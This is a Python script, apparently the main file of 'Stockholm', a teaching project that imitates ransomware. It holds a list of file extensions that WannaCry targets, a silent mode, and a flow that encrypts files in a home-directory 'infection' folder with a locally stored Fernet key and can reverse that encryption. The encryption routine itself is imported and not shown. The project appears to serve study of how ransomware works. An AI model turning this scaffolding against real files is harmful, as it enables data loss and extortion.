import argparse
import os
from cryptography.fernet import Fernet
from encrypted import start
from decrypted import decrypedFile


header = r"""
  ██████ ▄▄▄█████▓ ▒█████   ▄████▄   ██ ▄█▀ ██░ ██  ▒█████   ██▓     ███▄ ▄███▓
 ▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▓██░ ██▒▒██▒  ██▒▓██▒    ▓██▒▀█▀ ██▒
 ░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▒▓█    ▄ ▓███▄░ ▒██▀▀██░▒██░  ██▒▒██░    ▓██    ▓██░
   ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ ░▓█ ░██ ▒██   ██░▒██░    ▒██    ▒██ 
 ▒██████▒▒  ▒██▒ ░ ░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄░▓█▒░██▓░ ████▓▒░░██████▒▒██▒   ░██▒
 ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░   ░  ░
 ░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░ ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░ ▒  ░░  ░      ░
 ░  ░  ░    ░      ░ ░ ░ ▒  ░        ░ ░░ ░  ░  ░░ ░░ ░ ░ ▒    ░ ░   ░      ░   
       ░               ░ ░  ░ ░      ░  ░    ░  ░  ░    ░ ░      ░  ░       ░   
                           ░                                                   
"""
WannacryTarget = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", 
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", 
    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", 
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", 
    ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", 
    ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", 
    ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", 
    ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", 
    ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", 
    ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", 
    ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", 
    ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", 
    ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", 
    ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", 
    ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", 
    ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", 
    ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", 
    ".docb", ".docx", ".doc"
]

def arg_parse():
    print (header)

    desc = "Stockholm is a Python script designed for testing and \
        gaining a better understanding of how ransomware functions. \
        It encrypts data using the Fernet encryption method and appends \
        the '.ft' extension to all files within the specified folder. This \
        program exclusively operates within a folder named 'infection' located \
        in the user's HOME directory and only encrypts files whose extensions have \
        been targeted by Wannacry."

    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("-v", "--version", action="store_true", help="show the version of the program.")
    parser.add_argument("-r", "--reverse", nargs=1, metavar="<KEY>", help="reverse the infection with the <KEY> entered as argument")
    parser.add_argument("-s", "--silent", action="store_true", help="the program will not produce any output")
    return parser.parse_args()

def getHome(): 
    paths = os.path.expanduser("~")
    try:
        if paths is None:
                raise ValueError("Home path not found.")
        if os.path.isdir(paths) == False:
                raise ValueError("Home not a dir")
    except ValueError as error:
        print(f"Hata: {error}")
    return paths

def infectionFolder(home):
    infection_path = os.path.join(home, "infection")
    if not os.path.exists(infection_path):
        try:
            os.mkdir(infection_path)
        except Exception as e:
            print(f"Error: Could not create directory {infection_path}. Reason: {e}")
    return infection_path

def generate_key():
    key_file_path = "encryption.key"
    
    if os.path.exists(key_file_path):
        with open(key_file_path, 'rb') as key_file:
            key = key_file.read()
    else:
        key = Fernet.generate_key()
        with open(key_file_path, 'wb') as key_file:
            key_file.write(key)
    
    return key

def main():
    args = arg_parse() #argümanları pars edip alıyorum
    silent = False
    homePath = getHome() #kullanıcnın home dizininin yolunu alıyorum path varmı yokmu bunun kontrollerini yapıyorum
    if args.version:
       print("version : 1.0.0")
    elif args.silent:
        silent = args.silent
        print("Silent mode on")
        silent = True
    if args.reverse:
        key_path = args.reverse[0]
        with open(key_path, "rb") as f:
            key = f.read()
        decrypedFile(homePath, key, silent)
    if (not args.version and not args.reverse):
        infectionPath = infectionFolder(homePath) #home dizinine infection adında bir dosya yoksa oluşturuyor
        key = generate_key() #bana bir şifreleme anahtarı oluşturup dosyaya kaydediyor sonradan dosyaya kaydetme işin kaldırabilirim
        start(homePath, silent,WannacryTarget, infectionPath, key)

if __name__ == "__main__":
    main()
